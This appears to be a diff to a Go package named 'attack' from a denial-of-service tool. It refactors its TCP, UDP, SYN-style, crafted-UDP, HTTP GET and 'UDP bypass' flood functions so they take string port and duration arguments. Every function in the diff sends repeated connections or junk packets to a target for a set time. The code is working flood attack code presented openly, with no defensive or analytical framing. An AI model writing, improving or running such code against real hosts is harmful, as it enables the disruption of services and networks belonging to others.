@@ -2,6 +2,7 @@ package attack
 
 import (
 	"fmt"
+	"log"
 	"math/rand"
 	"net"
 	myhttp "net/http"
@@ -26,10 +27,16 @@ func generate_random_string(length int) string {
 }
 
 // tcp flood
-func TCP(ip string, port int, dur int) {
-	end := time.Now().Add(time.Duration(dur) * time.Second)
+func TCP(ip string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	end := time.Now().Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(end) {
-		tcp_socket, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+		tcp_socket, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
 		_, err := tcp_socket.Write([]byte(generate_random_string(1000)))
 		if err != nil {
 			fmt.Println(err)
@@ -39,10 +46,16 @@ func TCP(ip string, port int, dur int) {
 }
 
 // udp flood
-func UDP(ip string, port int, dur int) {
-	end := time.Now().Add(time.Duration(dur) * time.Second)
+func UDP(ip string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	end := time.Now().Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(end) {
-		udp_socket, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
+		udp_socket, _ := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
 		_, err := udp_socket.Write([]byte(generate_random_string(1000)))
 		if err != nil {
 			fmt.Println(err)
@@ -52,11 +65,17 @@ func UDP(ip string, port int, dur int) {
 }
 
 // syn flood
-func SYN(ip string, port int, dur int) {
+func SYN(ip string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
 	start_time := time.Now()
-	timeout := start_time.Add(time.Duration(dur) * time.Second)
+	timeout := start_time.Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(timeout) {
-		conn, err := net.Dial("tcp", ip+":"+strconv.Itoa(port))
+		conn, err := net.Dial("tcp", ip+":"+port)
 		if err == nil {
 			conn.Close()
 		}
@@ -64,13 +83,18 @@ func SYN(ip string, port int, dur int) {
 }
 
 // CRAFTED UPD flood
-func UDPRAPE(ip string, port int, dur int) {
+func UDPRAPE(ip string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+		return
+	}
 	packetSize := 1000
 
 	packetData := strings.Repeat("\xfe", packetSize)
-	end := time.Now().Add(time.Duration(dur) * time.Second)
+	end := time.Now().Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(end) {
-		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
+		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
 		conn.Write([]byte(packetData))
 		conn.Write(udprapepacket)
 		conn.Write(udprapecraftedpacket2)
@@ -79,20 +103,31 @@ func UDPRAPE(ip string, port int, dur int) {
 }
 
 // http Get flood
-func HTTP(target string, dur int) {
+func HTTP(target string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
 	start_time := time.Now()
-	timeout := start_time.Add(time.Duration(dur) * time.Second)
+	timeout := start_time.Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(timeout) {
-		_, _ = myhttp.Get(target)
+		_, _ = myhttp.Get(fmt.Sprintf("%s:%s", target, port))
 	}
 }
 
 // UDP bypass
-func UDP_VIP(target string, port int, dur int) {
+func UDP_VIP(target string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println(err)
+	}
+
 	data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}
-	end_time := time.Now().Add(time.Duration(dur) * time.Second)
+	end_time := time.Now().Add(time.Duration(newdur) * time.Second)
 	for time.Now().Before(end_time) {
-		conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
+		conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", target, port))
 		if err != nil {
 			break
 		}
